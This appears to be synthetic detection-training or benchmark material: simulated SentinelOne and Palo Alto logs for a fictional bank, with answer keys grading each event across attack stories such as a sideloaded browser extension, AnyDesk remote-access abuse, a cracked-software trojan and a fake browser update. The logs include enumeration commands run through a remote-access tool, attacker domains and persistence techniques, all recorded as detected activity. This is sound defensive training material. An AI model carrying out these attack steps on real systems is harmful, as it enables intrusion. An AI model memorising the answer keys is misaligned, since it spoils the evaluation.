  "agentDomain": "QBANK",
  "agentId": "1821822801199434344",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "desktop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "411044c64c09eecec98757559e74c245",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1840684445534363057",
    "inet": [
     "10.52.205.19"
    ],
    "inet6": [
     "fe80::8002:32f5:50d2:1c86"
    ],
    "name": "Ethernet",
    "physical": "73:AD:A4:2D:29:2F"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "General",
   "description": "Suspicious activity",
   "ids": [
    690
   ],
   "tactics": [
    {
     "name": "Execution",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1059/001/",
       "name": "T1059.001"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport": tr
```

#### ANSWER KEY — browser-extension
- evt_bext_01_sideload: verdict=tp mitre=T1176 authored: Chrome relaunched on WKS-QB-077 with a --load-extension flag pointing to an unpacked folder in b.schwarzer's Downloads directory.
- evt_bext_02_powershell: verdict=tp mitre=T1059.001 authored: chrome.exe on WKS-QB-077 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.
- evt_bext_03_beacon: verdict=tp mitre=T1071.001 authored: WKS-QB-077 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.
- evt_bext_04_detect: verdict=tp mitre=T1059.001 authored: SentinelOne killed the encoded PowerShell process and quarantined the sideloaded extension folder on WKS-QB-077, matching a known loader (family: ScriptBridge-variant).


### Story: tech-support-scam (foundation) — Tech-Support Scam → Unapproved Remote Access Tool

- 2026-05-27T14:00:00.000Z | badge=edr | vendor=SentinelOne | sev=low | host=LAP-QB-4471 | user=a.keller | "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to a.keller's Downloads folder on LAP-QB-4471."

NATIVE — SentinelOne Singularity (sentinelone/File Creation)
```json
{
 "timestamp": "2026-05-27T14:00:00.000Z",
 "event.time": 1779890400000,
 "event.type": "File Creation",
 "event.category": "file",
 "meta.event.name": "FILECREATION",
 "event.id": "01KSMVRAR00M0JMRPAW8PPAMT4_99",
 "trace.id": "01KSMVRAR00M0JMRPAW8PPAMT4",
 "packet.id": "27467BF9EE11F9638882447D61FDBD4F",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "4dac5aaac801782b30a368824768445c",
 "agent.version": "25.1.3.334",
 "endpoint.name": "LAP-QB-4471",
 "endpoint.os": "windows",
 "endpoint.type": "laptop",
 "os.name": "Windows 11 Enterprise",
 "tgt.file.path": "C:\\Users\\a.keller\\Downloads\\AnyDesk.exe",
 "tgt.file.extension": "exe",
 "tgt.file.size": 4192256,
 "tgt.file.type": "PE",
 "tgt.file.isExecutable": true,
 "tgt.file.location": "Local",
 "tgt.file.creationTime": 1779890400000,
 "tgt.file.modificationTime": 1779890400000,
 "tgt.file.id": "EF282402DB7032ED8C95",
 "tgt.file.sha256": "9bb1a3108c1bf98fc6cfc48fe23f8daafce656e65af3dfdb615bcb90ef80780c",
 "tgt.file.isSigned": "signed"
}
```

- 2026-05-27T14:04:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=LAP-QB-4471 | user=a.keller | "explorer.exe started AnyDesk.exe on LAP-QB-4471"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-27T14:04:00.000Z",
 "event.time": 1779890640000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSMVZN40PAWTC0Y408JJM8MC_215",
 "trace.id": "01KSMVZN40PAWTC0Y408JJM8MC",
 "packet.id": "AC0C3BF3F98F3822C98D1B47DF41AAB6",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "4dac5aaac801782b30a368824768445c",
 "agent.version": "25.1.3.334",
 "endpoint.name": "LAP-QB-4471",
 "endpoint.os": "windows",
 "endpoint.type": "laptop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "463761C104225D04",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "B51011AF78CCEEE2",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "QUANTUMBANK\\a.keller",
 "src.process.storyline.id": "61CBB60C33ED5A93",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "AnyDesk.exe",
 "tgt.process.pid": 5210,
 "tgt.process.uid": "463761C104225D04",
 "tgt.process.cmdline": "\"C:\\Users\\a.keller\\Downloads\\AnyDesk.exe\"",
 "tgt.process.image.path": "C:\\Users\\a.keller\\Downloads\\AnyDesk.exe",
 "tgt.process.image.sha256": "9bb1a3108c1bf98fc6cfc48fe23f8daafce656e65af3dfdb615bcb90ef80780c",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QUANTUMBANK\\a.keller",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779890640000,
 "tgt.process.storyline.id": "966CFACA60DC6CAA",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-27T14:05:30.000Z | badge=edr | vendor=SentinelOne | sev=medium | host=LAP-QB-4471 | user=a.keller | "AnyDesk.exe started cmd.exe on LAP-QB-4471"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-27T14:05:30.000Z",
 "event.time": 1779890730000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSMW1FQ000YWCAA2CE868PWE_117",
 "trace.id": "01KSMW1FQ000YWCAA2CE868PWE",
 "packet.id": "A67778A090B0514AAD971583A365F849",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "4dac5aaac801782b30a368824768445c",
 "agent.version": "25.1.3.334",
 "endpoint.name": "LAP-QB-4471",
 "endpoint.os": "windows",
 "endpoint.type": "laptop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "F095BA52F49F84B4",
 "src.process.name": "AnyDesk.exe",
 "src.process.pid": 5210,
 "src.process.uid": "463761C104225D04",
 "src.process.user": "QUANTUMBANK\\a.keller",
 "src.process.storyline.id": "966CFACA60DC6CAA",
 "src.process.isStorylineRoot": false,
 "tgt.process.name": "cmd.exe",
 "tgt.process.displayName": "Windows Command Processor",
 "tgt.process.pid": 5540,
 "tgt.process.uid": "F095BA52F49F84B4",
 "tgt.process.cmdline": "cmd.exe /c systeminfo & netstat -ano",
 "tgt.process.image.path": "C:\\Windows\\System32\\cmd.exe",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QUANTUMBANK\\a.keller",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1779890730000,
 "tgt.process.storyline.id": "966CFACA60DC6CAA",
 "tgt.process.isStorylineRoot": false,
 "tgt.process.signedStatus": "signed",
 "tgt.process.verifiedStatus": "verified",
 "tgt.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-27T14:06:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=LAP-QB-4471 | user=a.keller | "Threat detected on LAP-QB-4471"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1810518152238564302",
 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.49.191.248",
  "agentLastLoggedInUpn": "a.keller@quantumbank.ch",
  "agentLastLoggedInUserName": "a.keller",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "4dac5aaac801782b30a368824768445c",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 0,
  "agentComputerName": "LAP-QB-4471",
  "agentDecommissionedAt": null,
  "agentDomain": "QBANK",
  "agentId": "1858024541513400535",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "laptop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "4dac5aaac801782b30a368824768445c",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1837411090185334249",
    "inet": [
     "10.49.191.248"
    ],
    "inet6": [
     "fe80::7de6:8f23:9bad:f7df"
    ],
    "name": "Ethernet",
    "physical": "30:FB:E0:31:B7:66"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "PostExploitation",
   "description": "Suspicious activity",
   "ids": [
    619
   ],
   "tactics": [
    {
     "name": "Command and Control",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1219/",
       "name": "T1219"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsRepo
```

#### ANSWER KEY — tech-support-scam
- evt_rat_01_download: verdict=- mitre=- authored: AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to a.keller's Downloads folder on LAP-QB-4471.
- evt_rat_02_execute: verdict=tp mitre=T1219 authored: a.keller launched AnyDesk.exe on LAP-QB-4471 and granted remote-control access to an inbound session from an external caller.
- evt_rat_03_shell: verdict=tp mitre=T1059.003 authored: cmd.exe was spawned directly by AnyDesk.exe on LAP-QB-4471 and ran basic system and network enumeration commands.
- evt_rat_04_detect: verdict=tp mitre=T1219 authored: SentinelOne terminated AnyDesk.exe on LAP-QB-4471 after flagging it as an unapproved remote-access tool controlling a session and spawning shell commands.


### Story: cracked-software (foundation) — Cracked Software Installer → Scheduled Task Persistence

- 2026-05-29T20:10:00.000Z | badge=firewall | vendor=Palo Alto Networks | sev=low | host=LAP-QB-2290 | user=m.huber | "LAP-QB-2290 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:10, following a sponsored search result click."

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>May 29 20:10:00 PA-3220-HQ 1,2026/05/29 20:10:00,013217932013,THREAT,url,2562,2026/05/29 20:10:00,10.100.1.55,141.98.80.212,213.100.197.10,141.98.80.212,ALLOW-OUTBOUND-HTTPS,qbank\m.huber,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/05/29 20:10:00,104670,1,58122,443,13450,443,0x403000,tcp,allow,"fast-office-tools-download.top/",(9999),computer-and-internet-info,informational,client-to-server,6812226247315554814,0x0,10.0.0.0-10.255.255.255,,,,0,,,1,,,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"computer-and-internet-info,low-risk",713299e0-b8ef-4f6a-94ac-6edcc8071b78,0,,,,,,,,,LAP-QB-2290,,,,,,,,,,,,,,,,,,,,,2026-05-29T20:10:00.000+00:00,,,,encrypted-tunnel,networking,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,ssl,no,no,,NonProxyTraffic,
```

- 2026-05-29T20:16:00.000Z | badge=edr | vendor=SentinelOne | sev=high | host=LAP-QB-2290 | user=m.huber | "explorer.exe started Office_Pro_2026_Activator_Setup.exe on LAP-QB-2290"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-29T20:16:00.000Z",
 "event.time": 1780085760000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSTP2800PWY6TC66AAATRYCA_238",
 "trace.id": "01KSTP2800PWY6TC66AAATRYCA",
 "packet.id": "55DBDE4B12EA60FC19D73CA9A57BE4F6",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "0395d5bdb26a6ed0affd2587266393cd",
 "agent.version": "25.1.3.334",
 "endpoint.name": "LAP-QB-2290",
 "endpoint.os": "windows",
 "endpoint.type": "laptop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "725DCD12936823E3",
 "src.process.name": "explorer.exe",
 "src.process.displayName": "Windows Explorer",
 "src.process.pid": 3140,
 "src.process.uid": "8450932576F44960",
 "src.process.image.path": "C:\\Windows\\explorer.exe",
 "src.process.user": "QUANTUMBANK\\m.huber",
 "src.process.storyline.id": "5AB6D1CC22C683B3",
 "src.process.isStorylineRoot": true,
 "src.process.signedStatus": "signed",
 "src.process.verifiedStatus": "verified",
 "src.process.publisher": "MICROSOFT WINDOWS",
 "tgt.process.name": "Office_Pro_2026_Activator_Setup.exe",
 "tgt.process.pid": 6120,
 "tgt.process.uid": "725DCD12936823E3",
 "tgt.process.cmdline": "\"C:\\Users\\m.huber\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
 "tgt.process.image.path": "C:\\Users\\m.huber\\Downloads\\Office_Pro_2026_Activator_Setup.exe",
 "tgt.process.image.sha256": "7ba55188e95ea47d69b5d6b8c34229d7e19c469b9ad02a7c4fb5fec12390da41",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QUANTUMBANK\\m.huber",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1780085760000,
 "tgt.process.storyline.id": "01488BD527DC5147",
 "tgt.process.isStorylineRoot": true,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-29T20:16:40.000Z | badge=edr | vendor=SentinelOne | sev=high | host=LAP-QB-2290 | user=m.huber | "Scheduled task ran on LAP-QB-2290"

NATIVE — SentinelOne Singularity (sentinelone/Process Creation)
```json
{
 "timestamp": "2026-05-29T20:16:40.000Z",
 "event.time": 1780085800000,
 "event.type": "Process Creation",
 "event.category": "process",
 "meta.event.name": "PROCESSCREATION",
 "event.id": "01KSTP2800PWY6TC66AAATRYCA_946",
 "trace.id": "01KSTP2800PWY6TC66AAATRYCA",
 "packet.id": "55DBDE4B12EA60FC19D73CA9A57BE4F6",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "0395d5bdb26a6ed0affd2587266393cd",
 "agent.version": "25.1.3.334",
 "endpoint.name": "LAP-QB-2290",
 "endpoint.os": "windows",
 "endpoint.type": "laptop",
 "os.name": "Windows 11 Enterprise",
 "process.unique.key": "6B2F092C8115F239",
 "src.process.name": "Office_Pro_2026_Activator_Setup.exe",
 "src.process.pid": 13284,
 "src.process.uid": "13CD6F9B947FD6F5",
 "src.process.user": "QBANK\\m.huber",
 "src.process.storyline.id": "01488BD527DC5147",
 "src.process.isStorylineRoot": false,
 "tgt.process.name": "svchelper.exe",
 "tgt.process.pid": 8136,
 "tgt.process.uid": "6B2F092C8115F239",
 "tgt.process.cmdline": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
 "tgt.process.image.path": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
 "tgt.process.image.sha256": "77097f4423cd7e71ed1e747137f625f8b011b0116a35618adf6392c867f7e22d",
 "tgt.process.image.binaryIsExecutable": true,
 "tgt.process.user": "QBANK\\m.huber",
 "tgt.process.integrityLevel": "MEDIUM",
 "tgt.process.sessionId": 1,
 "tgt.process.startTime": 1780085800000,
 "tgt.process.storyline.id": "01488BD527DC5147",
 "tgt.process.isStorylineRoot": false,
 "tgt.process.subsystem": "SYS_WIN32",
 "tgt.process.isNative64Bit": false,
 "tgt.process.isRedirectCmdProcessor": false
}
```

- 2026-05-29T20:19:00.000Z | badge=edr | vendor=SentinelOne | sev=critical | host=LAP-QB-2290 | user=m.huber | "Threat detected on LAP-QB-2290"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1828624905908940050",
 "agentDetectionInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "agentDetectionState": null,
  "agentDomain": "QBANK",
  "agentIpV4": "10.27.198.37",
  "agentLastLoggedInUpn": "m.huber@quantumbank.ch",
  "agentLastLoggedInUserName": "m.huber",
  "agentMitigationMode": "protect",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentUuid": "0395d5bdb26a6ed0affd2587266393cd",
  "agentVersion": "25.1.3.334",
  "externalIp": "213.100.197.10",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ"
 },
 "agentRealtimeInfo": {
  "accountId": "1811388925835092259",
  "accountName": "Quantumbank",
  "activeThreats": 0,
  "agentComputerName": "LAP-QB-2290",
  "agentDecommissionedAt": null,
  "agentDomain": "QBANK",
  "agentId": "1833908545083578202",
  "agentInfected": false,
  "agentIsActive": true,
  "agentIsDecommissioned": false,
  "agentMachineType": "laptop",
  "agentMitigationMode": "protect",
  "agentNetworkStatus": "connected",
  "agentOsName": "Windows 11 Enterprise",
  "agentOsRevision": "26100",
  "agentOsType": "windows",
  "agentUuid": "0395d5bdb26a6ed0affd2587266393cd",
  "agentVersion": "25.1.3.334",
  "groupId": "1857524634001073935",
  "groupName": "Workstations",
  "networkInterfaces": [
   {
    "id": "1821369453749041811",
    "inet": [
     "10.27.198.37"
    ],
    "inet6": [
     "fe80::a236:b38b:2443:bd9f"
    ],
    "name": "Ethernet",
    "physical": "17:55:95:C2:83:6C"
   }
  ],
  "operationalState": "na",
  "rebootRequired": false,
  "siteId": "1894613334159270636",
  "siteName": "Quantumbank-HQ",
  "userActionsNeeded": []
 },
 "containerInfo": {
  "id": null,
  "image": null,
  "labels": null,
  "name": null
 },
 "indicators": [
  {
   "category": "Persistence",
   "description": "Trojan:Win32/Wacatac.B!ml",
   "ids": [
    922
   ],
   "tactics": [
    {
     "name": "Persistence",
     "source": "MITRE",
     "techniques": [
      {
       "link": "https://attack.mitre.org/techniques/T1053/005/",
       "name": "T1053.005"
      }
     ]
    }
   ]
  }
 ],
 "kubernetesInfo": {
  "cluster": null,
  "controllerKind": null,
  "controllerLabels": null,
  "controllerName": null,
  "namespace": null,
  "namespaceLabels": null,
  "node": null,
  "pod": null,
  "podLabels": null
 },
 "mitigationStatus": [
  {
   "action": "kill",
   "actionsCounters": {
    "failed": 0,
    "notFound": 0,
    "pendingReboot": 0,
    "success": 1,
    "total": 1
   },
   "agentSupportsReport"
```

#### ANSWER KEY — cracked-software
- evt_crack_01_download: verdict=- mitre=- authored: LAP-QB-2290 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:10, following a sponsored search result click.
- evt_crack_02_execute: verdict=tp mitre=T1204.002 authored: m.huber ran Office_Pro_2026_Activator_Setup.exe on LAP-QB-2290 with explorer.exe as the parent process; the binary is unsigned.
- evt_crack_03_persist: verdict=tp mitre=T1053.005 authored: Office_Pro_2026_Activator_Setup.exe created a scheduled task named OfficeLicenseRefresh on LAP-QB-2290 that runs C:\ProgramData\OfficeTools\svchelper.exe every 30 minutes.
- evt_crack_04_detect: verdict=tp mitre=T1053.005 authored: SentinelOne quarantined svchelper.exe on LAP-QB-2290 as a known trojan, removed the scheduled task, and terminated the installer.


### Story: fake-browser-update (foundation) — Fake Browser Update — Drive-by on a Trusted Site

- 2026-06-18T13:42:00.000Z | badge=firewall | vendor=Palo Alto Networks | sev=low | host=WKS-QB-033 | user=r.keller | "WKS-QB-033 loaded an article page on logisticsweekly.com, allowed under the category business-and-economy."

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>Jun 18 13:42:00 PA-3220-HQ 1,2026/06/18 13:42:00,013217932013,THREAT,url,2562,2026/06/18 13:42:00,10.100.1.108,185.199.108.153,213.100.197.10,185.199.108.153,CORP-WEB-OUTBOUND,nexacorp\r.keller,,web-browsing,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/06/18 13:42:00,519212,1,54202,443,19768,443,0x403000,tcp,alert,"logisticsweekly.com/2026/06/port-congestion-outlook",(9999),business-and-economy,informational,client-to-server,4732875944565099756,0x0,10.0.0.0-10.255.255.255,,,,0,,,1,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36,,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,get,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"business-and-economy,low-risk",ff940be6-2ec0-42d3-9c5f-98b3a7f7d2d3,0,,,,,,,,,WKS-QB-033,,,,,,,,,,,,,,,,,,,,,2026-06-18T13:42:00.000+00:00,,,,internet-utility,general-internet,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,web-browsing,no,no,,NonProxyTraffic,
```

- 2026-06-18T13:43:12.000Z | badge=firewall | vendor=Palo Alto Networks | sev=low | host=WKS-QB-033 | user=r.keller | "Browsed to cdn-static-assets-92.net"

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>Jun 18 13:43:12 PA-3220-HQ 1,2026/06/18 13:43:12,013217932013,THREAT,url,2562,2026/06/18 13:43:12,10.100.1.108,91.219.238.14,213.100.197.10,91.219.238.14,CORP-WEB-OUTBOUND,nexacorp\r.keller,,web-browsing,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/06/18 13:43:12,913039,1,64197,443,44367,443,0x403000,tcp,alert,"cdn-static-assets-92.net/loader/update-check.js",(9999),computer-and-internet-info,informational,client-to-server,6415395836583172026,0x0,10.0.0.0-10.255.255.255,,,,0,,,1,,,,https://logisticsweekly.com/2026/06/port-congestion-outlook,,,,0,0,0,0,0,,PA-3220-HQ,,,,get,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"computer-and-internet-info,low-risk",ff940be6-2ec0-42d3-9c5f-98b3a7f7d2d3,0,,,,,,,,,WKS-QB-033,,,,,,,,,,,,,,,,,,,,,2026-06-18T13:43:12.000+00:00,,,,internet-utility,general-internet,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,web-browsing,no,no,,NonProxyTraffic,
```

- 2026-06-18T13:45:40.000Z | badge=firewall | vendor=Palo Alto Networks | sev=medium | host=WKS-QB-033 | user=r.keller | "Browsed to cdn-static-assets-92.net"

NATIVE — Palo Alto Networks PAN-OS (paloalto/THREAT)
```
<14>Jun 18 13:45:40 PA-3220-HQ 1,2026/06/18 13:45:40,013217932013,THREAT,file,2562,2026/06/18 13:45:40,10.100.1.108,91.219.238.14,213.100.197.10,91.219.238.14,CORP-WEB-OUTBOUND,nexacorp\r.keller,,web-browsing,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/06/18 13:45:40,309605,1,51395,443,16301,443,0x403000,tcp,alert,"Chrome_Update_127.0.6533.js",Script File(52908),computer-and-internet-info,low,server-to-client,2181992251678663685,0x0,10.0.0.0-10.255.255.255,,,,0,f576ad0f92f04a2269d9e6890d99c8fb567accf7c2eeb39a35e3d9cb6b21811c,,1,,script,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,get,0,,0,,N/A,unknown,AppThreat-8988-9158,0x0,0,4294967295,,"computer-and-internet-info,low-risk",ff940be6-2ec0-42d3-9c5f-98b3a7f7d2d3,0,,,,,,,,,WKS-QB-033,,,,,,,,,,,,,,,,,,,,,2026-06-18T13:45:40.000+00:00,,,,internet-utility,general-internet,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,web-browsing,no,no,,NonProxyTraffic,
```

- 2026-06-18T13:45:44.000Z | badge=edr | vendor=SentinelOne | sev=low | host=WKS-QB-033 | user=r.keller | "chrome.exe wrote C:\Users\r.keller\Downloads\Chrome_Update_127.0.6533.js to disk."

NATIVE — SentinelOne Singularity (sentinelone/File Creation)
```json
{
 "timestamp": "2026-06-18T13:45:44.000Z",
 "event.time": 1781790344000,
 "event.type": "File Creation",
 "event.category": "file",
 "meta.event.name": "FILECREATION",
 "event.id": "01KVDFMNV0EC2TC4Y248P06M6A_186",
 "trace.id": "01KVDFMNV0EC2TC4Y248P06M6A",
 "packet.id": "FF6EBDEFA26385499B47200DBFCDA9B3",
 "i.scheme": "edr",
 "i.version": "preprocess-lib-1.0",
 "dataSource.name": "SentinelOne",
 "dataSource.vendor": "SentinelOne",
 "dataSource.category": "security",
 "account.id": "1811388925835092259",
 "account.name": "Quantumbank",
 "site.id": "1894613334159270636",
 "site.name": "Quantumbank-HQ",
 "group.id": "1857524634001073935",
 "mgmt.id": "98725",
 "mgmt.url": "usea1-012.sentinelone.net",
 "mgmt.osRevision": "26100",
 "agent.uuid": "627666a17149ecd25f452a1076bdab66",
 "agent.version": "25.1.3.334",
 "endpoint.name": "WKS-QB-033",
 "endpoint.os": "windows",
 "endpoint.type": "desktop",
 "os.name": "Windows 11 Enterprise",
 "tgt.file.path": "C:\\Users\\r.keller\\Downloads\\Chrome_Update_127.0.6533.js",
 "tgt.file.extension": "js",
 "tgt.file.type": "UNKNOWN",
 "tgt.file.isExecutable": false,
 "tgt.file.location": "Local",
 "tgt.file.creationTime": 1781790344000,
 "tgt.file.modificationTime": 1781790344000,
 "tgt.file.id": "810D0C3DA314C975A211",
 "tgt.file.sha256": "f576ad0f92f04a2269d9e6890d99c8fb567accf7c2eeb39a35e3d9cb6b21811c"
}
```

- 2026-06-18T13:47:08.000Z | badge=edr | vendor=SentinelOne | sev=high | host=WKS-QB-033 | user=r.keller | "explorer.exe started wscript.exe on WKS-QB-033"

NATIVE — SentinelOne Singularity (sentinelone/threat)
```json
{
 "id": "1832010827152428952",
